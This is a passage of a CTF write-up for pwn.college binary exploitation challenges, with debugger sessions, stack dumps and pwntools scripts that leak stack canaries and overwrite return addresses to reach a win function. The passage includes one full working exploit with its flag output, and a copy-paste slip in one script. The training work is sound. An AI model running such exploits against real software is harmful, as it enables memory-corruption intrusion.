   0x0000000000001fc3 <+249>:   mov    eax,0x0
   0x0000000000001fc8 <+254>:   call   0x1170 <printf@plt>
   0x0000000000001fcd <+259>:   mov    rax,QWORD PTR [rbp-0x158]
   0x0000000000001fd4 <+266>:   lea    rsi,[rip+0x11a3]        # 0x317e
   0x0000000000001fdb <+273>:   mov    rdi,rax
   0x0000000000001fde <+276>:   call   0x11f0 <strstr@plt>
   0x0000000000001fe3 <+281>:   test   rax,rax
   0x0000000000001fe6 <+284>:   je     0x2014 <challenge+330>
   0x0000000000001fe8 <+286>:   lea    rdi,[rip+0x1199]        # 0x3188
   0x0000000000001fef <+293>:   call   0x1140 <puts@plt>
   0x0000000000001ff4 <+298>:   mov    rdx,QWORD PTR [rbp-0x188]
   0x0000000000001ffb <+305>:   mov    rcx,QWORD PTR [rbp-0x180]
   0x0000000000002002 <+312>:   mov    eax,DWORD PTR [rbp-0x174]
   0x0000000000002008 <+318>:   mov    rsi,rcx
   0x000000000000200b <+321>:   mov    edi,eax
   0x000000000000200d <+323>:   call   0x1eca <challenge>
   0x0000000000002012 <+328>:   jmp    0x2025 <challenge+347>
   0x0000000000002014 <+330>:   lea    rdi,[rip+0x1197]        # 0x31b2
   0x000000000000201b <+337>:   call   0x1140 <puts@plt>
   0x0000000000002020 <+342>:   mov    eax,0x0
   0x0000000000002025 <+347>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000002029 <+351>:   xor    rcx,QWORD PTR fs:0x28
   0x0000000000002032 <+360>:   je     0x2039 <challenge+367>
   0x0000000000002034 <+362>:   call   0x1160 <__stack_chk_fail@plt>
   0x0000000000002039 <+367>:   leave
   0x000000000000203a <+368>:   ret
End of assembler dump.
```

Let's set breakpoints at `challenge+168` and `challenge+276` and run in order to get the address of the buffer and the expected substring.

```
pwndbg> break *(challenge+168)
Breakpoint 1 at 0x1f72
```

```
pwndbg> break *(challenge+276)
Breakpoint 2 at 0x1fde
```

```
pwndbg> run
Starting program: /challenge/latent-leak-hard 
###
### Welcome to /challenge/latent-leak-hard!
###

Payload size: 2
Send your payload (up to 2 bytes)!

Breakpoint 1, 0x000056877356cf72 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffc645e7d90 ◂— 0
 RBX  0x56877356d140 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  2
 RDI  0
 RSI  0x7ffc645e7d90 ◂— 0
 R8   0x23
 R9   0x23
 R10  0x56877356e13c ◂— ' bytes)!\n'
 R11  0x246
 R12  0x56877356c200 (_start) ◂— endbr64 
 R13  0x7ffc645e9010 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffc645e7ee0 —▸ 0x7ffc645e8f20 ◂— 0
 RSP  0x7ffc645e7d50 ◂— 0
 RIP  0x56877356cf72 (challenge+168) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x56877356cf72 <challenge+168>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffc645e7d90 ◂— 0
        nbytes: 2
 
   0x56877356cf77 <challenge+173>    mov    dword ptr [rbp - 0x164], eax
   0x56877356cf7d <challenge+179>    cmp    dword ptr [rbp - 0x164], 0
   0x56877356cf84 <challenge+186>    jns    challenge+232               <challenge+232>
 
   0x56877356cf86 <challenge+188>    call   __errno_location@plt        <__errno_location@plt>
 
   0x56877356cf8b <challenge+193>    mov    eax, dword ptr [rax]
   0x56877356cf8d <challenge+195>    mov    edi, eax
   0x56877356cf8f <challenge+197>    call   strerror@plt                <strerror@plt>
 
   0x56877356cf94 <challenge+202>    mov    rsi, rax
   0x56877356cf97 <challenge+205>    lea    rdi, [rip + 0x11aa]     RDI => 0x56877356e148 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x56877356cf9e <challenge+212>    mov    eax, 0                  EAX => 0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffc645e7d50 ◂— 0
01:0008│-188 0x7ffc645e7d58 —▸ 0x7ffc645e9028 —▸ 0x7ffc645e969c ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-180 0x7ffc645e7d60 —▸ 0x7ffc645e9018 —▸ 0x7ffc645e9680 ◂— '/challenge/latent-leak-hard'
03:0018│-178 0x7ffc645e7d68 ◂— 0x100000000
04:0020│-170 0x7ffc645e7d70 ◂— 0
05:0028│-168 0x7ffc645e7d78 ◂— 0
06:0030│-160 0x7ffc645e7d80 ◂— 2
07:0038│-158 0x7ffc645e7d88 —▸ 0x7ffc645e7d90 ◂— 0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x56877356cf72 challenge+168
   1   0x56877356d110 main+213
   2   0x74d581335083 __libc_start_main+243
   3   0x56877356c22e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7ffc645e7d90`
- [ ] Location of canary of the current function
- [ ] Location of the canary of the previously executed function
- [ ] Expected substring in order to loop the `challenge()` function
- [ ] Location of stored return address to `main()`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1dc9`

Before we continue execution, let's get the location saved return address and values of the two canaries.

```
pwndbg> info frame
Stack level 0, frame at 0x7ffc645e7ef0:
 rip = 0x56877356cf72 in challenge; saved rip = 0x56877356d110
 called by frame at 0x7ffc645e8f30
 Arglist at 0x7ffc645e7ee0, args: 
 Locals at 0x7ffc645e7ee0, Previous frame's sp is 0x7ffc645e7ef0
 Saved registers:
  rbp at 0x7ffc645e7ee0, rip at 0x7ffc645e7ee8
```

- [x] Location of buffer: `0x7ffc645e7d90`
- [ ] Location of canary of the current function
- [ ] Location of the canary of the previously executed function
- [ ] Expected substring in order to loop the `challenge()` function
- [x] Location of stored return address to `main()`: `0x7ffc645e7ee8`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1dc9`

Let's dump the stack pointed to by `rsi`.

```
pwndbg> x/50gx $rsi
0x7ffc645e7d90: 0x0000000000000000      0x0000000000000000
0x7ffc645e7da0: 0x0000000000000000      0x0000000000000000
0x7ffc645e7db0: 0x0000000000000000      0x000074d581520193
0x7ffc645e7dc0: 0x000000006ffffdff      0xd9065db93471fb00
0x7ffc645e7dd0: 0x000074d581503000      0x000056877356d140
0x7ffc645e7de0: 0x000056877356c200      0x00007ffc645e9010
0x7ffc645e7df0: 0x0000000000000000      0x0000000000000000
0x7ffc645e7e00: 0x00007ffc645e8f20      0x000074d581372d3f
0x7ffc645e7e10: 0x0000003000000010      0x00007ffc645e7ef0
0x7ffc645e7e20: 0x00007ffc645e7e30      0x000074d58139fe8d
0x7ffc645e7e30: 0x00000000001be6a0      0x000074d5814fe6a0
0x7ffc645e7e40: 0x0000000000000001      0x000074d5814fe723
0x7ffc645e7e50: 0x0000000000000d68      0x000074d5813a1951
0x7ffc645e7e60: 0x0000000000000d68      0x000000000000000a
0x7ffc645e7e70: 0x000074d5814fe6a0      0x0000568773570020
0x7ffc645e7e80: 0x000074d581504540      0x0000000000000000
0x7ffc645e7e90: 0x0000000000000000      0x000074d5813a1e93
0x7ffc645e7ea0: 0x000074d5814fe6a0      0x000000000000000a
0x7ffc645e7eb0: 0x0000568773570020      0x000074d581397302
0x7ffc645e7ec0: 0x000056877356d140      0x000056877356d140
0x7ffc645e7ed0: 0x00007ffc645e8f20      0xd9065db93471fb00
0x7ffc645e7ee0: 0x00007ffc645e8f20      0x000056877356d110
0x7ffc645e7ef0: 0x0000000000001000      0x00007ffc645e9028
0x7ffc645e7f00: 0x00007ffc645e9018      0x00000001001e8788
0x7ffc645e7f10: 0x00000000001e8788      0x0000000000005018
```

Since, we know that the location of return address to `main` is `0x7ffc645e7ed0`, we can find the canary of the current function 16 bytes before that.
We can also see the canary of the previous function, which was leftover in the above stack dump.

- [x] Location of buffer: `0x7ffc645e7d90`
- [x] Location of canary of the current function: `0x7ffc645e7ed8`
- [x] Location of the canary of the previously executed function: `0x7ffc645e7dc8`
- [ ] Expected substring in order to loop the `challenge()` function
- [x] Location of stored return address to `main()`: `0x7ffc645e7ee8`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1dc9`

Finally, let's continue program execution and get the expected string that would call the `challenge()` function to call itself.

```
pwndbg> c
Continuing.
aa
You said: aa

Breakpoint 2, 0x000056877356cfde in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffc645e7d90 ◂— 0x6161 /* 'aa' */
 RBX  0x56877356d140 (__libc_csu_init) ◂— endbr64 
 RCX  0
*RDX  0
*RDI  0x7ffc645e7d90 ◂— 0x6161 /* 'aa' */
*RSI  0x56877356e17e ◂— 0x544145504552 /* 'REPEAT' */
*R8   0xd
*R9   0xd
*R10  0x56877356e17c ◂— 0x544145504552000a /* '\n' */
 R11  0x246
 R12  0x56877356c200 (_start) ◂— endbr64 
 R13  0x7ffc645e9010 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffc645e7ee0 —▸ 0x7ffc645e8f20 ◂— 0
 RSP  0x7ffc645e7d50 ◂— 0
*RIP  0x56877356cfde (challenge+276) ◂— call strstr@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x56877356cfde <challenge+276>    call   strstr@plt                  <strstr@plt>
        haystack: 0x7ffc645e7d90 ◂— 0x6161 /* 'aa' */
        needle: 0x56877356e17e ◂— 0x544145504552 /* 'REPEAT' */
 
   0x56877356cfe3 <challenge+281>    test   rax, rax
   0x56877356cfe6 <challenge+284>    je     challenge+330               <challenge+330>
 
   0x56877356cfe8 <challenge+286>    lea    rdi, [rip + 0x1199]     RDI => 0x56877356e188 ◂— 'Backdoor triggered! Repeating challenge()'
   0x56877356cfef <challenge+293>    call   puts@plt                    <puts@plt>
 
   0x56877356cff4 <challenge+298>    mov    rdx, qword ptr [rbp - 0x188]
   0x56877356cffb <challenge+305>    mov    rcx, qword ptr [rbp - 0x180]
   0x56877356d002 <challenge+312>    mov    eax, dword ptr [rbp - 0x174]
   0x56877356d008 <challenge+318>    mov    rsi, rcx
   0x56877356d00b <challenge+321>    mov    edi, eax
   0x56877356d00d <challenge+323>    call   challenge                   <challenge>
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffc645e7d50 ◂— 0
01:0008│-188 0x7ffc645e7d58 —▸ 0x7ffc645e9028 —▸ 0x7ffc645e969c ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-180 0x7ffc645e7d60 —▸ 0x7ffc645e9018 —▸ 0x7ffc645e9680 ◂— '/challenge/latent-leak-hard'
03:0018│-178 0x7ffc645e7d68 ◂— 0x100000000
04:0020│-170 0x7ffc645e7d70 ◂— 0
05:0028│-168 0x7ffc645e7d78 ◂— 0x200000000
06:0030│-160 0x7ffc645e7d80 ◂— 2
07:0038│-158 0x7ffc645e7d88 —▸ 0x7ffc645e7d90 ◂— 0x6161 /* 'aa' */
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x56877356cfde challenge+276
   1   0x56877356d110 main+213
   2   0x74d581335083 __libc_start_main+243
   3   0x56877356c22e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7ffc645e7d90`
- [x] Location of canary of the current function: `0x7ffc645e7ed8`
- [x] Location of the canary of the previously executed function: `0x7ffc645e7dc8`
- [x] Expected substring in order to loop the `challenge()` function: `REPEAT`
- [x] Location of stored return address to `main()`: `0x7ffc645e7ee8`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1dc9`

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

# Initialize data
buffer_addr = 0x7ffc645e7d90
prev_func_canary_addr = 0x7ffc645e7dc8
curr_func_canary_addr = 0x7ffc645e7ed8
addr_of_saved_ip = 0x7ffc645e7ee8
safe_win_auth_offset = 0x1dc9

attempt = 0

while True:
    attempt += 1
    p = process('/challenge/latent-leak-hard')
    
    try:
        # Standard offsets for this challenge level
        # If your previous leak was 24, try 24, but let's verify the output
        offset_to_prev_func_canary = prev_func_canary_addr - buffer_addr               # Distance from start of buffer to the canary
        payload_size = offset_to_prev_func_canary + 1

        # --- STAGE 1: LEAK ---
        p.recvuntil(b'Payload size: ')
        p.sendline(str(payload_size).encode())

        payload = b'REPEAT'
        payload += b'A' * (offset_to_prev_func_canary - 6)
        payload += b'B' 

        p.recvuntil(b'bytes)!')
        p.send(payload)

        # Grab the leak
        p.recvuntil(b'AAAAAB')
        canary_raw = p.recv(7)
        canary = u64(canary_raw.rjust(8, b'\x00'))

        # --- STAGE 2: EXPLOIT ---
        offset_to_prev_func_canary = curr_func_canary_addr - buffer_addr 
        offset_to_ret = addr_of_saved_ip - (curr_func_canary_addr + 8)         # Distance from canary to the return address (usually 16 bytes: 8 for canary + 8 for RBP) 

        p.recvuntil(b'Payload size: ')
        
        # Build payload: [Padding] + [Canary] + [RBP Padding] + [RIP Partial]
        exploit = b"A" * offset_to_prev_func_canary
        exploit += p64(canary)
        exploit += b"B" * offset_to_ret
        exploit += struct.pack("<H", safe_win_auth_offset)

        p.sendline(str(len(exploit)).encode())
        p.recvuntil(b'bytes)!')
        p.send(exploit)

        # Increase timeout slightly to allow the flag to print
        output = p.recvall(timeout=1).decode(errors="ignore")
        
        if "pwn.college{" in output:
            print(f"!!! FLAG FOUND ON ATTEMPT {attempt} !!!")
            print(output)
            break

    except EOFError:
        pass
    finally:
        p.close()
```

```
hacker@program-security~latent-leak-hard:/$ python ~/script.py 
!!! FLAG FOUND ON ATTEMPT 42 !!!

You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Goodbye!
You win! Here is your flag:
pwn.college{w0w5Lz9440WBt2OeNSkABCeyLa6.0lNxMDL4ITM0EzW}
```

&nbsp;

## Fork Foolery (Easy)

```
hacker@program-security~fork-foolery-easy:/$ /challenge/fork-foolery-easy 
###
### Welcome to /challenge/fork-foolery-easy!
###

This challenge is listening for connections on TCP port 1337.

The challenge supports unlimited sequential connections.
```

Let's write a small script to senf `"Hello World"` to the challenge.

```py title="~/script.py" showLineNumbers
from pwn import *

# Configuration
HOST = '127.0.0.1'
PORT = 1337

context.log_level = 'info'

# 1. Connect to the challenge
p = remote(HOST, PORT)

# 2. Wait for the size prompt
p.recvuntil(b"Payload size: ")

# 3. Tell the program we are sending 11 bytes ("Hello World")
p.sendline(b"11")

# 4. Wait for the confirmation message
p.recvuntil(b"bytes)!")

# 5. Send the actual string
p.send(b"Hello World")

# 6. Print the program's response
print("\n--- RESPONSE ---")
print(p.recvall(timeout=1).decode(errors='ignore'))

p.close()
```

```
hacker@program-security~fork-foolery-easy:/$ python ~/script.py 
[+] Opening connection to 127.0.0.1 on port 1337: Done

--- RESPONSE ---
[+] Receiving all data: Done (2.57KB)
[*] Closed connection to 127.0.0.1 port 1337

You sent 11 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff04f2a710 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007fff04f2a718 (rsp+0x0008) | f8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8f8 |
| 0x00007fff04f2a720 (rsp+0x0010) | e8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8e8 |
| 0x00007fff04f2a728 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
| 0x00007fff04f2a730 (rsp+0x0020) | a0 b6 42 de 4c 76 00 00 | 0x0000764cde42b6a0 |
| 0x00007fff04f2a738 (rsp+0x0028) | b8 ba ae a7 0b 00 00 00 | 0x0000000ba7aebab8 |
| 0x00007fff04f2a740 (rsp+0x0030) | 0b 00 00 00 00 00 00 00 | 0x000000000000000b |
| 0x00007fff04f2a748 (rsp+0x0038) | 50 a7 f2 04 ff 7f 00 00 | 0x00007fff04f2a750 |
| 0x00007fff04f2a750 (rsp+0x0040) | 48 65 6c 6c 6f 20 57 6f | 0x6f57206f6c6c6548 |
| 0x00007fff04f2a758 (rsp+0x0048) | 72 6c 64 00 00 00 00 00 | 0x0000000000646c72 |
| 0x00007fff04f2a760 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff04f2a768 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff04f2a770 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff04f2a778 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff04f2a780 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff04f2a788 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff04f2a790 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff04f2a798 (rsp+0x0088) | 00 b4 7c 97 45 d3 e0 2d | 0x2de0d345977cb400 |
| 0x00007fff04f2a7a0 (rsp+0x0090) | f0 b7 f2 04 ff 7f 00 00 | 0x00007fff04f2b7f0 |
| 0x00007fff04f2a7a8 (rsp+0x0098) | 8e 93 ae a7 a4 64 00 00 | 0x000064a4a7ae938e |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fff04f2a750
- the saved frame pointer (of main) is at 0x7fff04f2a7a0
- the saved return address (previously to main) is at 0x7fff04f2a7a8
- the saved return address is now pointing to 0x64a4a7ae938e.
- the canary is stored at 0x7fff04f2a798.
- the canary value is now 0x2de0d345977cb400.
- the address of win_authed() is 0x64a4a7ae87b4.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

Goodbye!
### Goodbye!
```

So, in this challenge, we have to brute-force the canary and partially over-write the return address.

### Brute forcing the canary

Let's overwrite the known `\x00` byte of the canary with a `\x00` to see the program's output.

```py title="~/script.py" showLineNumbers
from pwn import *

# Configuration
HOST = '127.0.0.1'
PORT = 1337
OFFSET_TO_CANARY = 72 

context.log_level = 'info'

# 1. Connect
p = remote(HOST, PORT)

# 2. Handle Size Prompt
p.recvuntil(b"Payload size: ")
# 72 bytes of padding + 1 byte for the canary null
p.sendline(b"73")

# 3. Send Payload
p.recvuntil(b"bytes)!")
# Payload: Padding followed by the first byte of the canary (\x00)
payload = b"A" * OFFSET_TO_CANARY + b"\x00"
p.send(payload)

# 4. Print Response
print("\n--- RESPONSE ---")
print(p.recvall(timeout=1).decode(errors='ignore'))

p.close()
```

```
hacker@program-security~fork-foolery-easy:/$ python ~/script.py 
[+] Opening connection to 127.0.0.1 on port 1337: Done

--- RESPONSE ---
[+] Receiving all data: Done (2.57KB)
[*] Closed connection to 127.0.0.1 port 1337

You sent 73 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff04f2a710 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007fff04f2a718 (rsp+0x0008) | f8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8f8 |
| 0x00007fff04f2a720 (rsp+0x0010) | e8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8e8 |
| 0x00007fff04f2a728 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
| 0x00007fff04f2a730 (rsp+0x0020) | a0 b6 42 de 4c 76 00 00 | 0x0000764cde42b6a0 |
| 0x00007fff04f2a738 (rsp+0x0028) | b8 ba ae a7 49 00 00 00 | 0x00000049a7aebab8 |
| 0x00007fff04f2a740 (rsp+0x0030) | 49 00 00 00 00 00 00 00 | 0x0000000000000049 |
| 0x00007fff04f2a748 (rsp+0x0038) | 50 a7 f2 04 ff 7f 00 00 | 0x00007fff04f2a750 |
| 0x00007fff04f2a750 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a758 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a760 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a768 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a770 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a778 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a780 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a788 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a790 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a798 (rsp+0x0088) | 00 b4 7c 97 45 d3 e0 2d | 0x2de0d345977cb400 |
| 0x00007fff04f2a7a0 (rsp+0x0090) | f0 b7 f2 04 ff 7f 00 00 | 0x00007fff04f2b7f0 |
| 0x00007fff04f2a7a8 (rsp+0x0098) | 8e 93 ae a7 a4 64 00 00 | 0x000064a4a7ae938e |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fff04f2a750
- the saved frame pointer (of main) is at 0x7fff04f2a7a0
- the saved return address (previously to main) is at 0x7fff04f2a7a8
- the saved return address is now pointing to 0x64a4a7ae938e.
- the canary is stored at 0x7fff04f2a798.
- the canary value is now 0x2de0d345977cb400.
- the address of win_authed() is 0x64a4a7ae87b4.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

Goodbye!
### Goodbye!
```

Now, let's overwrite the `\x00` byte with a `\x01` byte.

```py title="~/script.py" showLineNumbers
from pwn import *

# Configuration
HOST = '127.0.0.1'
PORT = 1337
OFFSET_TO_CANARY = 72 

context.log_level = 'info'

# 1. Connect
p = remote(HOST, PORT)

# 2. Handle Size Prompt
p.recvuntil(b"Payload size: ")
# 72 bytes of padding + 1 byte for the canary null
p.sendline(b"73")

# 3. Send Payload
p.recvuntil(b"bytes)!")
# Payload: Padding followed by the first byte of the canary (\x00)
payload = b"A" * OFFSET_TO_CANARY + b"\x00"
p.send(payload)

# 4. Print Response
print("\n--- RESPONSE ---")
print(p.recvall(timeout=1).decode(errors='ignore'))

p.close()
```

```
hacker@program-security~fork-foolery-easy:/$ python ~/script.py 
[+] Opening connection to 127.0.0.1 on port 1337: Done

--- RESPONSE ---
[+] Receiving all data: Done (2.60KB)
[*] Closed connection to 127.0.0.1 port 1337

You sent 73 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff04f2a710 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007fff04f2a718 (rsp+0x0008) | f8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8f8 |
| 0x00007fff04f2a720 (rsp+0x0010) | e8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8e8 |
| 0x00007fff04f2a728 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
| 0x00007fff04f2a730 (rsp+0x0020) | a0 b6 42 de 4c 76 00 00 | 0x0000764cde42b6a0 |
| 0x00007fff04f2a738 (rsp+0x0028) | b8 ba ae a7 49 00 00 00 | 0x00000049a7aebab8 |
| 0x00007fff04f2a740 (rsp+0x0030) | 49 00 00 00 00 00 00 00 | 0x0000000000000049 |
| 0x00007fff04f2a748 (rsp+0x0038) | 50 a7 f2 04 ff 7f 00 00 | 0x00007fff04f2a750 |
| 0x00007fff04f2a750 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a758 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a760 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a768 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a770 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a778 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a780 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a788 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a790 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a798 (rsp+0x0088) | 01 b4 7c 97 45 d3 e0 2d | 0x2de0d345977cb401 |
| 0x00007fff04f2a7a0 (rsp+0x0090) | f0 b7 f2 04 ff 7f 00 00 | 0x00007fff04f2b7f0 |
| 0x00007fff04f2a7a8 (rsp+0x0098) | 8e 93 ae a7 a4 64 00 00 | 0x000064a4a7ae938e |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fff04f2a750
- the saved frame pointer (of main) is at 0x7fff04f2a7a0
- the saved return address (previously to main) is at 0x7fff04f2a7a8
- the saved return address is now pointing to 0x64a4a7ae938e.
- the canary is stored at 0x7fff04f2a798.
- the canary value is now 0x2de0d345977cb401.
- the address of win_authed() is 0x64a4a7ae87b4.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

Goodbye!
*** stack smashing detected ***: terminated
```

The string `stack smashing detected` will be our oracle whch tells us if our brute-forced byte is correct.

As for the return address brute force, we already know how to do it. But first we need the offset of the instruction within `win_authed()` which skips the authentication.

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x00000000000011a0  __cxa_finalize@plt
0x00000000000011b0  putchar@plt
0x00000000000011c0  __errno_location@plt
0x00000000000011d0  puts@plt
0x00000000000011e0  setsockopt@plt
0x00000000000011f0  write@plt
0x0000000000001200  __stack_chk_fail@plt
0x0000000000001210  htons@plt
0x0000000000001220  dup2@plt
0x0000000000001230  printf@plt
0x0000000000001240  geteuid@plt
0x0000000000001250  close@plt
0x0000000000001260  read@plt
0x0000000000001270  listen@plt
0x0000000000001280  setvbuf@plt
0x0000000000001290  bind@plt
0x00000000000012a0  open@plt
0x00000000000012b0  accept@plt
0x00000000000012c0  __isoc99_scanf@plt
0x00000000000012d0  exit@plt
0x00000000000012e0  strerror@plt
0x00000000000012f0  wait@plt
0x0000000000001300  fork@plt
0x0000000000001310  socket@plt
0x0000000000001320  _start
0x0000000000001350  deregister_tm_clones
0x0000000000001380  register_tm_clones
0x00000000000013c0  __do_global_dtors_aux
0x0000000000001400  frame_dummy
0x0000000000001409  DUMP_STACK
0x000000000000160c  bin_padding
0x00000000000017b4  win_authed
0x00000000000018d1  challenge
0x000000000000216e  main
0x00000000000023c0  __libc_csu_init
0x0000000000002430  __libc_csu_fini
0x0000000000002438  _fini
```

#### `win()`

```
pwndbg> disass win_authed 
Dump of assembler code for function win_authed:
   0x00000000000017b4 <+0>:     endbr64
   0x00000000000017b8 <+4>:     push   rbp
   0x00000000000017b9 <+5>:     mov    rbp,rsp
   0x00000000000017bc <+8>:     sub    rsp,0x10
   0x00000000000017c0 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x00000000000017c3 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
   0x00000000000017ca <+22>:    jne    0x18ce <win_authed+282>
   0x00000000000017d0 <+28>:    lea    rdi,[rip+0x1919]        # 0x30f0

# ---- snip ----

   0x00000000000018ce <+282>:   nop
   0x00000000000018cf <+283>:   leave
   0x00000000000018d0 <+284>:   ret
End of assembler dump.
```

We know the address of `win_authed()` is `0x64a4a7ae87b4`, so the same offset would be `0x87d0`.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *
